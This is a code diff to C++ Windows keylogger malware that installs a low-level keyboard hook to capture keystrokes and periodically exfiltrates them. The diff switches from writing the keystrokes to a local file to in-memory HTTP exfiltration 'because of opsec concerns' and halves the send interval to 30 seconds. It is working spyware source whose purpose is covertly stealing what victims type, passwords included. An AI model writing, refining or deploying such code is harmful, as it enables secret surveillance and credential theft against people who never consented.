@@ -19,10 +19,12 @@ namespace APIHook
 		if (workingKeyLog.empty())
 		{
 			Auxiliary::logError("APIHook::preExfilProcedure() - Nothing was logged into the temp workingKeyLog!");
-			return;
+			workingKeyLog += "There were no keystrokes during this period of logging!";
 		}
 		
-		std::string newLogFilePath = IO::writeToLog(workingKeyLog);
+		//Temp removing the log file capability in favor of on demand exfil through http bc of opsec concerns
+
+		/*std::string newLogFilePath = IO::writeToLog(workingKeyLog);
 		Auxiliary::logError("APIHook::preExfilProcedure() - workingKeyLog has been pushed to key log file!");
 		
 		if (newLogFilePath.empty())
@@ -32,9 +34,9 @@ namespace APIHook
 		else
 		{
 			Auxiliary::logError("APIHook::preExfilProcedure() - IO::writeToLog() has generated a new key log file!");
-		}
+		}*/
 
-		if (Exfiltrate::exfilLogs(newLogFilePath))
+		if (Exfiltrate::exfilLogs(workingKeyLog))
 		{
 			Auxiliary::logError("APIHook::preExfilProcedure() - Exfiltrate::exfilLogs() has successfully transferred the logs to tom!");
 			workingKeyLog = "";
@@ -47,7 +49,7 @@ namespace APIHook
 
 	//Change exfiltration interval here...remember...time is in miliseconds!
 
-	Timer logExfilTimer(preExfilProcedure, 1000 * 60, Timer::Infinite);
+	Timer logExfilTimer(preExfilProcedure, 1000 * 30, Timer::Infinite);
 
 	/* The hookingProcedure() function is used with the SetWindowsHookEx() function. 
 	The system calls this function every time a new keyboard input event is about 
@@ -57,8 +59,8 @@ namespace APIHook
 	If nCode is less than 0, the hook procedure must pass the message to CallNextHookEx()
 	without further processing and should return what is returned by it. 
 	
-	Lastly, wParam is just an id for the keyboard message 
-	and lParam is a pointer to a KBDLLHOOK strcuture. 
+	Lastly, wParam is just an ID for the keyboard message (wether its syskey or regular key)
+	and lParam is a pointer to a KBDLLHOOK strcuture which is filled with relevant information about the key pressed. 
 	
 	If nCode is less than zero, the hook procedure must return the value returned by CallNextHookEx(), 
 	otherwise, other applications that have installed WH_KEYBOARD_LL hooks will not receive hook notifications 
@@ -74,9 +76,13 @@ namespace APIHook
 			CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 		}
 
+		//Below is the lParam structure passed in being assigned to a local method struct ptr for easier use
+
 		KBDLLHOOKSTRUCT* keyPress = (KBDLLHOOKSTRUCT*)lParam;
 		
 		/*	
+			wParam ID values:
+
 			WM_KEYDOWN is when a regular key is pressed (i.e caps lock, a, b, c)
 			WM_SYSKEYDOWN is when combination keys or system buttons are pressed (i.e alt+tab, alt+insert) 
 			WM_KEYUP is when a regular key is released
@@ -148,9 +154,7 @@ namespace APIHook
 		else
 		{
 			logExfilTimer.startTimer(true);
-			Auxiliary::logError("API::installHook() - Windows keyboard hook installed!");
-			Auxiliary::logError("API::installHook() - Log exfiltration timer has begun!");
-
+			Auxiliary::logError("API::installHook() - Windows keyboard hook installed & log exfiltration timer started!");
 		}
 	}
 
